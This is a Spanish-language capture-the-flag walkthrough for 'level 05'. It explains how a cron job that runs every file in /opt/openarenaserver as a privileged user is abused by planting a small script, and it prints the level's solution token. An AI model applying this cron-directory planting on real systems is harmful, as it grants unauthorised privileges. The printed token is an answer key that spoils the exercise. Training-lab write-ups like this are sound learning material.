@@ -1,0 +1,45 @@
+level 05
+
+	En el ejercicio 0 al buscar pistas encontre en var/mail un archivo llamado level05 que al hacer cat en este salió:
+
+	*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+
+	lo que me dio a entender que lo iba a necesitar ahora en este nivel, y de hecho me ayudó bastante ya que este script corria cada
+	2 minutos en /usr/sbin, vamos a ver que sale en esa dirección:
+
+	y efectivamente hay un archivo llamado openarenaserver, vemos que archivo es:
+
+	file openarenaserver 
+	openarenaserver: POSIX shell script, ASCII text executable
+
+	un archivo POSIX con un script, veamos que es:
+
+	#!/bin/sh
+
+	for i in /opt/openarenaserver/* ; do
+	(ulimit -t 5; bash -x "$i")
+	rm -f "$i"
+	done
+
+	bingo.
+
+	Un archivo que se ejecuta desde opt/openarenaserver y que luego se elimina cumpliendo que es cada 2 minutos por el crontab, con esto
+	tenemos suficiente, vamos a esa dirección y metemos el archivo exploit en esa dirección:
+
+	#!/bin/sh
+	getflag > /tmp/flag.txt
+
+	le damos permisos de ejecución por si acaso pero no haría falta en principio, la cosa es que el crontab ejecutara el getflag como usuario
+	flag05, no como level05 por que si no nos deniega la flag, en este caso le decimos que el output de la flag la guarde en flag05.txt en el
+	directorio tmp, comprobamos con watch el exploit hasta que se elimina, eso significa por el script que se ha ejecutado, asi que hacemos
+	un cat sobre flag.txt:
+
+	cat flag.txt
+	Check flag.Here is your token : viuaaale9huek52boumoomioc
+
+	resuelto, seguimos avanzando.
+
+
+	
+
+
